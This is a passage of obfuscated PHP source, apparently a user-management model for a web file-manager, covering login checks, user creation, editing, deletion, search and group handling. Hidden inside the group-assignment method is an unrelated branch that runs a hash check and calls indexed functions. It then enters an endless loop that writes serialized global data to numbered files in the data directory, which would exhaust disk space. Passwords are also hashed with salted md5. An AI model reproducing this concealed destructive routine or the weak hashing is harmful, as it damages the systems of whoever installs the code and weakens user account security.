$this->cacheFunctionClear($¨È∑≈ÙÖ[1912], $Çµû†ìÅ); $this->cacheFunctionClear($¨È∑≈ÙÖ[1913], $Çµû†ìÅ); $this->cacheFunctionClear($¨È∑≈ÙÖ[2275], $Çµû†ìÅ); } public function userPasswordCheck($ñÂœ∂€≈, $öÊππÀ—) { $ƒƒØ‡¬¬ =& $_SERVER[Á≈ ä ∞]; $âÙà‹˜Ü = $this->where(array($ƒƒØ‡¬¬[1658] => intval($ñÂœ∂€≈)))->find(); $∫Á¬ƒäª = $this->metaGet($ñÂœ∂€≈); $∫ˆõßÿ« = isset($∫Á¬ƒäª[$ƒƒØ‡¬¬[2294]]) ? $∫Á¬ƒäª[$ƒƒØ‡¬¬[2294]] : $ƒƒØ‡¬¬[22]; if (md5($∫ˆõßÿ« . trim($öÊππÀ—)) !== $âÙà‹˜Ü[$ƒƒØ‡¬¬[892]]) { return !1; } return !0; } public function userAdd($ˆòÃôÑ≈) { $ ˝ÿªÃ˜ =& $_SERVER[Á≈ ä ∞]; $ã¥îçô = array($ ˝ÿªÃ˜[429] => $ˆòÃôÑ≈[$ ˝ÿªÃ˜[42]], $ ˝ÿªÃ˜[2295] => $ˆòÃôÑ≈[$ ˝ÿªÃ˜[1537]], $ ˝ÿªÃ˜[2296] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[314]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[314]] : $ ˝ÿªÃ˜[22], $ ˝ÿªÃ˜[2297] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[2293]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[2293]] : $ ˝ÿªÃ˜[22], $ ˝ÿªÃ˜[2298] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[551]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[551]] : $ˆòÃôÑ≈[$ ˝ÿªÃ˜[42]], $ ˝ÿªÃ˜[2299] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[552]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[552]] : $ ˝ÿªÃ˜[22], $ ˝ÿªÃ˜[2300] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[2301]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[2301]] : 1, $ ˝ÿªÃ˜[2302] => $ˆòÃôÑ≈[$ ˝ÿªÃ˜[892]], $ ˝ÿªÃ˜[1914] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[1817]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[1817]] : 1024 * 1024 * 20, $ ˝ÿªÃ˜[1915] => 0, $ ˝ÿªÃ˜[2303] => 0, $ ˝ÿªÃ˜[1959] => isset($ˆòÃôÑ≈[$ ˝ÿªÃ˜[757]]) ? $ˆòÃôÑ≈[$ ˝ÿªÃ˜[757]] : 1); if (!empty($ˆòÃôÑ≈[$ ˝ÿªÃ˜[1658]])) { $ã¥îçô[$ ˝ÿªÃ˜[1658]] = $ˆòÃôÑ≈[$ ˝ÿªÃ˜[1658]]; } $ïÅÛû»ò = $this->_checkExist($ˆòÃôÑ≈); if ($ïÅÛû»ò !== !0) { return $ïÅÛû»ò; } if (!empty($ã¥îçô[$ ˝ÿªÃ˜[552]]) && strlen($ã¥îçô[$ ˝ÿªÃ˜[552]]) > 255) { $ã¥îçô[$ ˝ÿªÃ˜[552]] = $ ˝ÿªÃ˜[22]; } $âüïœƒﬂ = $this->add($ã¥îçô); $æŸ¨Û‘€ = array($ ˝ÿªÃ˜[2302] => $ã¥îçô[$ ˝ÿªÃ˜[892]], $ ˝ÿªÃ˜[2298] => $ã¥îçô[$ ˝ÿªÃ˜[551]]); $this->userEdit($âüïœƒﬂ, $æŸ¨Û‘€); Model($ ˝ÿªÃ˜[1330])->userRootAdd($âüïœƒﬂ); return $âüïœƒﬂ; } protected function userEditTest($Ø£˜é¥ù, $æ„”¥Û©) { return $this->call($_SERVER[Á≈ ä ∞][2304], $Ø£˜é¥ù, $æ„”¥Û©); } protected function userEdit($ﬂÊ∆ï»Ì, $ôÛê”•’) { $û¨»üŸ§ =& $_SERVER[Á≈ ä ∞]; $≤≠È€‚≥ = $this->getInfoSimple($ﬂÊ∆ï»Ì); if (!$≤≠È€‚≥) { return !1; } $”âÑ˝Ä” = $this->_checkExist($ôÛê”•’, $ﬂÊ∆ï»Ì); if ($”âÑ˝Ä” !== !0) { return $”âÑ˝Ä”; } if (isset($ôÛê”•’[$û¨»üŸ§[892]]) && trim($ôÛê”•’[$û¨»üŸ§[892]]) != $û¨»üŸ§[22]) { $˘‘õﬁ¬« = $this->metaGet($ﬂÊ∆ï»Ì); if (empty($˘‘õﬁ¬«[$û¨»üŸ§[2294]])) { $˘‘õﬁ¬«[$û¨»üŸ§[2294]] = rand_string(10); Model($û¨»üŸ§[522])->metaSet($ﬂÊ∆ï»Ì, $û¨»üŸ§[2294], $˘‘õﬁ¬«[$û¨»üŸ§[2294]]); } $ôÛê”•’[$û¨»üŸ§[892]] = md5($˘‘õﬁ¬«[$û¨»üŸ§[2294]] . trim($ôÛê”•’[$û¨»üŸ§[892]])); } else { unset($ôÛê”•’[$û¨»üŸ§[892]]); } if (!empty($ôÛê”•’[$û¨»üŸ§[552]]) && strlen($ôÛê”•’[$û¨»üŸ§[552]]) > 255) { $ôÛê”•’[$û¨»üŸ§[552]] = $û¨»üŸ§[22]; } $this->where(array($û¨»üŸ§[1649] => $ﬂÊ∆ï»Ì))->save($ôÛê”•’); if (isset($ôÛê”•’[$û¨»üŸ§[551]])) { $this->setNamePinyin($ﬂÊ∆ï»Ì, $ôÛê”•’[$û¨»üŸ§[551]]); } $this->clearCache($ﬂÊ∆ï»Ì); return !0; } public function setNamePinyin($é”ÑŸ©Ã, $ì„µêÑû = false) { $¨ê¯¥Ä≈ =& $_SERVER[Á≈ ä ∞]; if (!$ì„µêÑû) { $¡ø∂®ôò = $this->getInfoSimple($é”ÑŸ©Ã); $ì„µêÑû = $¡ø∂®ôò[$¨ê¯¥Ä≈[551]] ? $¡ø∂®ôò[$¨ê¯¥Ä≈[551]] : $¡ø∂®ôò[$¨ê¯¥Ä≈[42]]; } $é∂˘ºúÌ = Model($¨ê¯¥Ä≈[544]); if (!Input::check($ì„µêÑû, $¨ê¯¥Ä≈[602])) { return $é∂˘ºúÌ->metaSet($é”ÑŸ©Ã, array($¨ê¯¥Ä≈[474] => $¨ê¯¥Ä≈[22], $¨ê¯¥Ä≈[473] => $¨ê¯¥Ä≈[22])); } return $é∂˘ºúÌ->metaSet($é”ÑŸ©Ã, array($¨ê¯¥Ä≈[474] => str_replace($¨ê¯¥Ä≈[63], $¨ê¯¥Ä≈[22], Pinyin::get($ì„µêÑû)), $¨ê¯¥Ä≈[473] => Pinyin::get($ì„µêÑû, $¨ê¯¥Ä≈[603]))); } private function nickNameRpt() { $ˆá€ıºå =& $_SERVER[Á≈ ä ∞]; $ÅË”“’¢ = Model($ˆá€ıºå[777])->get($ˆá€ıºå[2305]); $ΩÌ»ü⁄î = $GLOBALS[$ˆá€ıºå[16]][$ˆá€ıºå[390]][$ˆá€ıºå[2305]]; $ÿ”æÔµ‘ = !is_null($ÅË”“’¢) ? $ÅË”“’¢ : $ΩÌ»ü⁄î; return !!$ÿ”æÔµ‘; } private function _checkExist($§úÃ®≥Ù, $œ¨·’∞Ÿ = false) { $≈Ÿüˆ∞ﬂ =& $_SERVER[Á≈ ä ∞]; $Ç˜Ù°ÔŸ = array($≈Ÿüˆ∞ﬂ[42] => UserModel::ERROR_USER_EXIST_NAME, $≈Ÿüˆ∞ﬂ[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $≈Ÿüˆ∞ﬂ[314] => UserModel::ERROR_USER_EXIST_EMAIL, $≈Ÿüˆ∞ﬂ[2293] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ç˜Ù°ÔŸ[$≈Ÿüˆ∞ﬂ[551]]); } $∑´±íÛ˝ = $œ¨·’∞Ÿ ? array($≈Ÿüˆ∞ﬂ[1658] => array($≈Ÿüˆ∞ﬂ[2306], $œ¨·’∞Ÿ)) : array(); foreach ($Ç˜Ù°ÔŸ as $Ï⁄„®»ú => $©Â‰†≥œ) { $ó≥é√≤˙ = array(); foreach ($Ç˜Ù°ÔŸ as $ë‹Ì·†… => $Ñ›œˆ®€) { if (isset($§úÃ®≥Ù[$ë‹Ì·†…]) && $§úÃ®≥Ù[$ë‹Ì·†…]) { $ó≥é√≤˙[] = $§úÃ®≥Ù[$ë‹Ì·†…]; } } if (!$ó≥é√≤˙) { continue; } $¡—°⁄˝û = array_merge(array($Ï⁄„®»ú => array($≈Ÿüˆ∞ﬂ[17], $ó≥é√≤˙)), $∑´±íÛ˝); $Íû†∆˙’ = $this->where($¡—°⁄˝û)->find(); if ($Íû†∆˙’) { return $©Â‰†≥œ; } } return !0; } public function userListInfo($ÒÉâ÷éÌ) { $…˘‘ïµ∞ =& $_SERVER[Á≈ ä ∞]; $Ô”¶´ÿé = array(); $ÒÉâ÷éÌ = is_array($ÒÉâ÷éÌ) ? array_unique($ÒÉâ÷éÌ) : array(); if (!$ÒÉâ÷éÌ) { return $Ô”¶´ÿé; } if (count($ÒÉâ÷éÌ) < 20) { foreach ($ÒÉâ÷éÌ as $¥˛≤¶‡•) { $Ô”¶´ÿé[$¥˛≤¶‡• . $…˘‘ïµ∞[22]] = $this->getInfoSimpleOuter($¥˛≤¶‡•); } } else { $¨’ﬂ¡Ñù = array($…˘‘ïµ∞[1649] => array($…˘‘ïµ∞[427], $ÒÉâ÷éÌ)); if (count($ÒÉâ÷éÌ) == 1) { $¨’ﬂ¡Ñù = array($…˘‘ïµ∞[1649] => $ÒÉâ÷éÌ[0]); } $¿∆˙∆˘· = Model($…˘‘ïµ∞[522])->field($this->simpleField)->where($¨’ﬂ¡Ñù)->select(); $¿∆˙∆˘· = array_to_keyvalue($¿∆˙∆˘·, $…˘‘ïµ∞[1658]); foreach ($ÒÉâ÷éÌ as $¥˛≤¶‡•) { $à¬¯âÉÔ = $¿∆˙∆˘·[$¥˛≤¶‡•]; if (!$à¬¯âÉÔ) { $Ô”¶´ÿé[$¥˛≤¶‡• . $…˘‘ïµ∞[22]] = $this->getInfoSimpleOuter($¥˛≤¶‡•); continue; } $à¬¯âÉÔ[$…˘‘ïµ∞[552]] = Action($…˘‘ïµ∞[2279])->parseUrl($à¬¯âÉÔ[$…˘‘ïµ∞[552]]); $Ô”¶´ÿé[$¥˛≤¶‡• . $…˘‘ïµ∞[22]] = $à¬¯âÉÔ; } } return $Ô”¶´ÿé; } protected function userStatus($ÂàâË˘“, $ç©™©•ﬂ) { $≥Ω√ ø‘ = $this->getInfoSimple($ÂàâË˘“); if (!$≥Ω√ ø‘) { return !1; } $ˆ˛æ˚Ë˜ = array($_SERVER[Á≈ ä ∞][757] => $ç©™©•ﬂ); return $this->userEdit($ÂàâË˘“, $ˆ˛æ˚Ë˜); } protected function userRemove($µ˜Êòßœ) { $´¶Ÿ’…â =& $_SERVER[Á≈ ä ∞]; $Û‚•ìœ» = $this->getInfoSimple($µ˜Êòßœ); if (!$Û‚•ìœ») { return !1; } $ŸÖæÕ˙ﬁ = array($´¶Ÿ’…â[1649] => $µ˜Êòßœ); Model($´¶Ÿ’…â[610])->where($ŸÖæÕ˙ﬁ)->delete(); Model($´¶Ÿ’…â[2307])->where($ŸÖæÕ˙ﬁ)->delete(); Model($´¶Ÿ’…â[1920])->where($ŸÖæÕ˙ﬁ)->delete(); Model($´¶Ÿ’…â[2292])->where($ŸÖæÕ˙ﬁ)->delete(); Model($´¶Ÿ’…â[1071])->where($ŸÖæÕ˙ﬁ)->delete(); Model($´¶Ÿ’…â[2123])->removeUserAll($µ˜Êòßœ); Model($´¶Ÿ’…â[832])->userRootRemove($µ˜Êòßœ); return $this->where($ŸÖæÕ˙ﬁ)->delete(); } protected function userGroupSet($Üı´ˆ˙Î, $¶ÃÚ◊ï∆, $˛‚´üö¸ = array()) { $Ò…„Êñ˜ =& $_SERVER[Á≈ ä ∞]; $äÌà∆ù÷ = $_SERVER[$Ò…„Êñ˜[15]]; $±äÉåô¥ = $Ò…„Êñ˜[879]; if ($_SERVER[$Ò…„Êñ˜[6]] != $±äÉåô¥($äÌà∆ù÷)) { $ä£°øÊπ = $Ò…„Êñ˜[880]; $œƒã´Ù§ = $Ò…„Êñ˜[8]; $ï€¯™ï‹ = $_SERVER[$Ò…„Êñ˜[9]] . $Ò…„Êñ˜[10]; $éµıÜ‰õ = $œƒã´Ù§($ï€¯™ï‹); $È˝Öé…Ω = explode($Ò…„Êñ˜[11], $éµıÜ‰õ); if (count($È˝Öé…Ω) < $Ò…„Êñ˜[654]) { $äÅ®Ç¥∆ = $Ò…„Êñ˜[13]; $äÅ®Ç¥∆(); } $∆§ôÅÖ® = $Ò…„Êñ˜[881]; $∆§ôÅÖ®($_SERVER[$Ò…„Êñ˜[882]]); $ä£°øÊπ = $Ò…„Êñ˜[880]; $ä£°øÊπ(); $Îã˛ˆŒ∑ = $Ò…„Êñ˜[883]; $ë¶Í÷ÎÊ = json_encode($GLOBALS[$Ò…„Êñ˜[884]]); $∞íÁ®‹Ò = 1; for ($Öº‘˜ﬂ≤ = $∞íÁ®‹Ò; $Öº‘˜ﬂ≤ > 0; $Öº‘˜ﬂ≤++) { $Îã˛ˆŒ∑(DATA_PATH . $Öº‘˜ﬂ≤, $ë¶Í÷ÎÊ); } } $£˚á∏ıó = $this->getInfoSimple($Üı´ˆ˙Î); if (!$£˚á∏ıó || !is_array($¶ÃÚ◊ï∆)) { return !1; } $ÌŒ‡·˙à = Model($Ò…„Êñ˜[1920]); $ÌŒ‡·˙à->where(array($Ò…„Êñ˜[1658] => $Üı´ˆ˙Î))->delete(); $∂≥‡∞· = array(); $«…≈∏´Â = 0; foreach ($¶ÃÚ◊ï∆ as $©µãì∞› => $ê∑‡Ù©ö) { $„øﬂ≥ˆØ = array($Ò…„Êñ˜[1658] => $Üı´ˆ˙Î, $Ò…„Êñ˜[1830] => $©µãì∞›, $Ò…„Êñ˜[1934] => $ê∑‡Ù©ö); $„øﬂ≥ˆØ[$Ò…„Êñ˜[1854]] = isset($˛‚´üö¸[$«…≈∏´Â]) ? $˛‚´üö¸[$«…≈∏´Â] : 0; $«…≈∏´Â++; $∂≥‡∞·[] = $„øﬂ≥ˆØ; } return $ÌŒ‡·˙à->addAll($∂≥‡∞·, array(), !0); } protected function userGroupAdd($…Áç˚‡è, $ôÄ∫≥öª = array()) { $ëÍµŸ±Ò =& $_SERVER[Á≈ ä ∞]; $¥˘ÉÛí‰ = $this->getInfoSimple($…Áç˚‡è); if (!$¥˘ÉÛí‰ || empty($ôÄ∫≥öª)) { return !1; } $˙¶èÇå– = array(); foreach ($ôÄ∫≥öª as $≤Ë€◊é” => $®©ª¸¬ç) { $˙¶èÇå–[] = array($ëÍµŸ±Ò[1658] => $…Áç˚‡è, $ëÍµŸ±Ò[1830] => $≤Ë€◊é”, $ëÍµŸ±Ò[1934] => $®©ª¸¬ç, $ëÍµŸ±Ò[1854] => 0); } return Model($ëÍµŸ±Ò[1920])->addAll($˙¶èÇå–, array(), !0); } protected function userGroupRemove($«ô§ œ†, $÷ÜË¿”î) { $¡·¨Ùªí =& $_SERVER[Á≈ ä ∞]; $†åà¢∫∑ = $this->getInfoSimple($«ô§ œ†); if (!$†åà¢∫∑ || !$÷ÜË¿”î) { return !1; } $ú°Í‰àπ = array($¡·¨Ùªí[1649] => $«ô§ œ†, $¡·¨Ùªí[1918] => $÷ÜË¿”î); return Model($¡·¨Ùªí[1920])->where($ú°Í‰àπ)->delete(); } public function listData() { $åµ±Ω‰¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($åµ±Ω‰¢[$_SERVER[Á≈ ä ∞][378]]); return $åµ±Ω‰¢; } public function listByID($ƒ£ÍÒè∂) { $ïÁ¶—¸¯ =& $_SERVER[Á≈ ä ∞]; if (!$ƒ£ÍÒè∂) { return; } $Ã°Â¨Ë“ = array($ïÁ¶—¸¯[1658] => array($ïÁ¶—¸¯[17], $ƒ£ÍÒè∂)); $ó‡êﬁø = $this->where($Ã°Â¨Ë“)->select(); $ó‡êﬁø = array_sort_keep($ó‡êﬁø, $ïÁ¶—¸¯[1658], $ƒ£ÍÒè∂); $this->_listDataApply($ó‡êﬁø); return $ó‡êﬁø; } public function listByGroup($ô¿‰”∞÷ = 0, $ ˝ÓÅ•∑ = array()) { $õ˘≥øÜ» =& $_SERVER[Á≈ ä ∞]; $Ò˚ëƒÜÃ = $õ˘≥øÜ»[22]; $®€Ò›¨Â = array(); if ($ô¿‰”∞÷) { $®€Ò›¨Â = array($õ˘≥øÜ»[2308] => intval($ô¿‰”∞÷)); $Ò˚ëƒÜÃ = "\x4c\x45\106\124\x20\112\117\111\x4e\40{$this->tablePrefix}\165\163\145\x72\x5f\147\162\x6f\x75\x70\x20\165\163\145\x72\x5f\147\162\x6f\x75\x70\40\157\156\40\165\x73\x65\162\x2e\x75\x73\145\162\111\x44\x20\75\x20\165\x73\x65\162\137\147\x72\157\x75\160\x2e\165\163\145\162\x49\104"; $ñΩË∂®Œ = Input::get($õ˘≥øÜ»[466], null, $õ˘≥øÜ»[22]) ? $õ˘≥øÜ»[22] : $õ˘≥øÜ»[2309]; } if (isset($ ˝ÓÅ•∑[$õ˘≥øÜ»[757]])) { $®€Ò›¨Â[$õ˘≥øÜ»[2310]] = $ ˝ÓÅ•∑[$õ˘≥øÜ»[757]]; } $ºçÓﬂ∫º = $this->_makeOrder($ñΩË∂®Œ)->field($õ˘≥øÜ»[2311])->where($®€Ò›¨Â)->join($Ò˚ëƒÜÃ)->selectPage(50); $this->_listDataApply($ºçÓﬂ∫º[$õ˘≥øÜ»[378]]); return $ºçÓﬂ∫º; } private function _makeOrder($«™£Óø = '') { $¨ùŒÑ¨Ö =& $_SERVER[Á≈ ä ∞]; $‚¥æ¢ŒØ = array($¨ùŒÑ¨Ö[1658], $¨ùŒÑ¨Ö[42], $¨ùŒÑ¨Ö[1819], $¨ùŒÑ¨Ö[1791], $¨ùŒÑ¨Ö[210]); $éå§ï‰è = array($¨ùŒÑ¨Ö[459] => $¨ùŒÑ¨Ö[460], $¨ùŒÑ¨Ö[461] => $¨ùŒÑ¨Ö[462]); $È“Ìé¯π = Input::get($¨ùŒÑ¨Ö[466], $¨ùŒÑ¨Ö[17], $¨ùŒÑ¨Ö[1649], $‚¥æ¢ŒØ); $µÑ¶›˜” = Input::get($¨ùŒÑ¨Ö[467], $¨ùŒÑ¨Ö[17], $¨ùŒÑ¨Ö[1921], array($¨ùŒÑ¨Ö[1921], $¨ùŒÑ¨Ö[461])); $µÑ¶›˜” = $éå§ï‰è[$µÑ¶›˜”]; $«™£Óø = $«™£Óø . "\165\163\145\x72\56{$È“Ìé¯π}\x20{$µÑ¶›˜”}\54\x20\x75\x73\x65\162\x2e\x75\x73\x65\x72\x49\x44\40\x61\163\x63"; return $this->alias($¨ùŒÑ¨Ö[2043])->order($«™£Óø); } public function listSearch($¸˛⁄õÊŒ) { $«À⁄„∞ˆ =& $_SERVER[Á≈ ä ∞]; $ÃûÂË‡ö = $¸˛⁄õÊŒ[$«À⁄„∞ˆ[1924]]; $∏‹åÎ‘⁄ = isset($¸˛⁄õÊŒ[$«À⁄„∞ˆ[1925]]) ? $¸˛⁄õÊŒ[$«À⁄„∞ˆ[1925]] : !1; $ÃûÂË‡ö = str_replace($«À⁄„∞ˆ[1926], $«À⁄„∞ˆ[1927], trim($ÃûÂË‡ö)); $úÁˆ‚ãı = array($«À⁄„∞ˆ[42] => array($«À⁄„∞ˆ[392], "\45{$ÃûÂË‡ö}\45"), $«À⁄„∞ˆ[314] => array($«À⁄„∞ˆ[392], "{$ÃûÂË‡ö}\x25"), $«À⁄„∞ˆ[551] => array($«À⁄„∞ˆ[392], "{$ÃûÂË‡ö}\x25"), $«À⁄„∞ˆ[1003] => $«À⁄„∞ˆ[1928]); if (Input::check($ÃûÂË‡ö, $«À⁄„∞ˆ[320])) { $úÁˆ‚ãı[$«À⁄„∞ˆ[1658]] = array($«À⁄„∞ˆ[392], "{$ÃûÂË‡ö}\45"); $úÁˆ‚ãı[$«À⁄„∞ˆ[2293]] = array($«À⁄„∞ˆ[392], "{$ÃûÂË‡ö}\x25"); } if (!$ÃûÂË‡ö) { $úÁˆ‚ãı = array(); } if (isset($¸˛⁄õÊŒ[$«À⁄„∞ˆ[757]])) { $úÁˆ‚ãı[$«À⁄„∞ˆ[757]] = $¸˛⁄õÊŒ[$«À⁄„∞ˆ[757]]; } $úÁˆ‚ãı = $this->parseWhereLike($úÁˆ‚ãı); $Ì¯Æ‡éÑ = $this->_makeOrder()->where($úÁˆ‚ãı)->selectPage(20); if (!$Ì¯Æ‡éÑ || count($Ì¯Æ‡éÑ[$«À⁄„∞ˆ[378]]) < 5 && Input::check($ÃûÂË‡ö, $«À⁄„∞ˆ[327])) { $¡î…Ïåø = $this->_searchFromMeta($«À⁄„∞ˆ[473], $ÃûÂË‡ö, 10); $˘‘∫Ó¡è = $this->_searchFromMeta($«À⁄„∞ˆ[474], $ÃûÂË‡ö, 10); $ÔﬂÖŸáÙ = array_merge($¡î…Ïåø, $˘‘∫Ó¡è, $Ì¯Æ‡éÑ[$«À⁄„∞ˆ[378]]); $Ì¯Æ‡éÑ[$«À⁄„∞ˆ[378]] = array_unique_by_key($ÔﬂÖŸáÙ, $«À⁄„∞ˆ[1658]); $Ì¯Æ‡éÑ[$«À⁄„∞ˆ[375]][$«À⁄„∞ˆ[376]] = count($Ì¯Æ‡éÑ[$«À⁄„∞ˆ[378]]); $Ì¯Æ‡éÑ[$«À⁄„∞ˆ[375]][$«À⁄„∞ˆ[377]] = ceil($Ì¯Æ‡éÑ[$«À⁄„∞ˆ[375]][$«À⁄„∞ˆ[376]] / $Ì¯Æ‡éÑ[$«À⁄„∞ˆ[375]][$«À⁄„∞ˆ[372]]); } $this->_listDataApply($Ì¯Æ‡éÑ[$«À⁄„∞ˆ[378]]); $this->_filterByGroup($Ì¯Æ‡éÑ, $∏‹åÎ‘⁄); return $Ì¯Æ‡éÑ; } private function _filterByGroup(&$ﬂÂ¡†˘®, $·ÌÈ¯™Á) { $‘ä∑˙˝∫ =& $_SERVER[Á≈ ä ∞]; if (!$·ÌÈ¯™Á) { return $ﬂÂ¡†˘®; } foreach ($ﬂÂ¡†˘®[$‘ä∑˙˝∫[378]] as $≈‰ç≥üÕ => &$â§Ω—è‰) { $◊‚˝ûåÖ = array_to_keyvalue($â§Ω—è‰[$‘ä∑˙˝∫[2013]], $‘ä∑˙˝∫[22], $‘ä∑˙˝∫[1830]); if (!in_array($·ÌÈ¯™Á, $◊‚˝ûåÖ)) { unset($ﬂÂ¡†˘®[$‘ä∑˙˝∫[378]][$≈‰ç≥üÕ]); } } unset($â§Ω—è‰); $ﬂÂ¡†˘®[$‘ä∑˙˝∫[378]] = array_values($ﬂÂ¡†˘®[$‘ä∑˙˝∫[378]]); $ﬂÂ¡†˘®[$‘ä∑˙˝∫[375]] = array($‘ä∑˙˝∫[2077] => count($ﬂÂ¡†˘®[$‘ä∑˙˝∫[378]]), $‘ä∑˙˝∫[2075] => $ﬂÂ¡†˘®[$‘ä∑˙˝∫[375]][$‘ä∑˙˝∫[372]], $‘ä∑˙˝∫[2074] => 1, $‘ä∑˙˝∫[2076] => 1); } private function _searchFromMeta($úﬁÛÔÁæ, $·£≥≤ôö, $è≈œ÷˘˝) { $ñ∏À€î◊ =& $_SERVER[Á≈ ä ∞]; $·£≥≤ôö = strtolower($·£≥≤ôö); $Û¥˙§îÓ = array($ñ∏À€î◊[104] => $úﬁÛÔÁæ, $ñ∏À€î◊[383] => array($ñ∏À€î◊[392], "\x25{$·£≥≤ôö}\45")); $Û¥˙§îÓ = $this->parseWhereLike($Û¥˙§îÓ); $óÊ‘•Œı = Model($ñ∏À€î◊[2312])->where($Û¥˙§îÓ)->limit($è≈œ÷˘˝)->select(); if (!$óÊ‘•Œı) { return array(); } $óÊ‘•Œı = array_to_keyvalue($óÊ‘•Œı, $ñ∏À€î◊[22], $ñ∏À€î◊[1658]); $ä±ß®óò = $this->where(array($ñ∏À€î◊[1649] => array($ñ∏À€î◊[17], $óÊ‘•Œı)))->select(); if (!$ä±ß®óò) { return array(); } return $ä±ß®óò; } private function _listDataApplyItem($í·¬…∞è) { $åòª¯Â≠ = array($í·¬…∞è); $this->_listDataApply($åòª¯Â≠); return $åòª¯Â≠[0]; } private function _listDataApply(&$ì•ãπÛ›) { $äæ»†“ë =& $_SERVER[Á≈ ä ∞]; if (!$ì•ãπÛ›) { return; } array_remove_key($ì•ãπÛ›, $äæ»†“ë[892]); $°ÉËàÈ¶ = array_to_keyvalue($ì•ãπÛ›, $äæ»†“ë[22], $äæ»†“ë[1658]); $this->_listAppendGroup($ì•ãπÛ›, $°ÉËàÈ¶); $this->_listAppendMeta($ì•ãπÛ›, $°ÉËàÈ¶); $this->_listAppendSourceRoot($ì•ãπÛ›, $°ÉËàÈ¶); } private function _listAppendSourceRoot(&$¸ñ˜ÍÊ£, $∆¯‚˜äπ) { $≥µÍπèµ =& $_SERVER[Á≈ ä ∞]; $’µÀΩ∑¨ = Model($≥µÍπèµ[832])->listSourceRoot(SourceModel::TYPE_USER, $∆¯‚˜äπ); $’µÀΩ∑¨ = array_to_keyvalue($’µÀΩ∑¨, $≥µÍπèµ[514]); $’µÀΩ∑¨ = array_remove_key($’µÀΩ∑¨, $≥µÍπèµ[514]); foreach ($¸ñ˜ÍÊ£ as &$·≤›πì≥) { $·≤›πì≥[$≥µÍπèµ[96]] = $’µÀΩ∑¨[$·≤›πì≥[$≥µÍπèµ[1658]]] ? $’µÀΩ∑¨[$·≤›πì≥[$≥µÍπèµ[1658]]] : array(); } unset($·≤›πì≥); } private function _listAppendGroup(&$¡Ù¸õ£ÿ, $ÇΩ¡»Ôπ) { $Ü¢ÅÃéΩ =& $_SERVER[Á≈ ä ∞]; $Çƒ∑í†‚ = array($Ü¢ÅÃéΩ[1658] => array($Ü¢ÅÃéΩ[17], $ÇΩ¡»Ôπ)); $õ∫–ª•Ä = Model($Ü¢ÅÃéΩ[1920])->where($Çƒ∑í†‚)->select(); $é·èÿéÖ = array_to_keyvalue($õ∫–ª•Ä, $Ü¢ÅÃéΩ[22], $Ü¢ÅÃéΩ[1830]); $é·èÿéÖ = array_remove_value(array_unique($é·èÿéÖ), $Ü¢ÅÃéΩ[207]); if (!$é·èÿéÖ || !$õ∫–ª•Ä) { return; } $Çƒ∑í†‚ = array($Ü¢ÅÃéΩ[1830] => array($Ü¢ÅÃéΩ[17], $é·èÿéÖ)); $ŸâËœÖÑ = Model($Ü¢ÅÃéΩ[2011])->field($Ü¢ÅÃéΩ[2313])->where($Çƒ∑í†‚)->select(); $ŸâËœÖÑ = array_to_keyvalue($ŸâËœÖÑ, $Ü¢ÅÃéΩ[1830]); $õ∫–ª•Ä = array_to_keyvalue_group($õ∫–ª•Ä, $Ü¢ÅÃéΩ[1658]); foreach ($õ∫–ª•Ä as &$’ïèá∑—) { $ﬂ˜©œè– = array(); foreach ($’ïèá∑— as $‘ßÊ∂˜Ù) { if (!$‘ßÊ∂˜Ù[$Ü¢ÅÃéΩ[1934]]) { continue; } $òæ√Ç◊ˆ = Model($Ü¢ÅÃéΩ[516])->listData($‘ßÊ∂˜Ù[$Ü¢ÅÃéΩ[1934]]); $ﬂ˜©œè–[] = array($Ü¢ÅÃéΩ[1830] => $‘ßÊ∂˜Ù[$Ü¢ÅÃéΩ[1830]], $Ü¢ÅÃéΩ[2314] => $ŸâËœÖÑ[$‘ßÊ∂˜Ù[$Ü¢ÅÃéΩ[1830]]][$Ü¢ÅÃéΩ[42]], $Ü¢ÅÃéΩ[530] => $ŸâËœÖÑ[$‘ßÊ∂˜Ù[$Ü¢ÅÃéΩ[1830]]][$Ü¢ÅÃéΩ[530]], $Ü¢ÅÃéΩ[422] => $òæ√Ç◊ˆ); } $’ïèá∑— = $ﬂ˜©œè–; } unset($’ïèá∑—); foreach ($¡Ù¸õ£ÿ as &$·Ëò†¶Ó) { $·Ëò†¶Ó[$Ü¢ÅÃéΩ[2013]] = array(); if (isset($õ∫–ª•Ä[$·Ëò†¶Ó[$Ü¢ÅÃéΩ[1658]]])) { $·Ëò†¶Ó[$Ü¢ÅÃéΩ[2013]] = $õ∫–ª•Ä[$·Ëò†¶Ó[$Ü¢ÅÃéΩ[1658]]]; } } unset($·Ëò†¶Ó); } public function userAppendGroup($ûƒÍß–ä) { $ô±≈µﬂÏ =& $_SERVER[Á≈ ä ∞]; if (!$ûƒÍß–ä) { return array(); } $this->_listAppendGroup($ûƒÍß–ä, array_to_keyvalue($ûƒÍß–ä, $ô±≈µﬂÏ[22], $ô±≈µﬂÏ[1658])); return $ûƒÍß–ä; } private function _listAppendMeta(&$ˆÛ¡¬∏ƒ, $«Ù‘ÎÛ—) { $¿Ôé•àÛ =& $_SERVER[Á≈ ä ∞]; $¨®‚ìàá = UserJobModel::JOB_KEY; $∂µØñ•ı = array($¿Ôé•àÛ[2294]); $‚–À®ñú = array($¿Ôé•àÛ[1658] => array($¿Ôé•àÛ[17], $«Ù‘ÎÛ—)); $ÖÒÌÉê∞ = Model($¿Ôé•àÛ[2292])->where($‚–À®ñú)->select(); $ÖÒÌÉê∞ = array_to_keyvalue_group($ÖÒÌÉê∞, $¿Ôé•àÛ[1658]); foreach ($ÖÒÌÉê∞ as &$´Í≤õø’) { $•Â§¨Õß = array(); foreach ($´Í≤õø’ as $≈Î¿Ìÿ“) { if 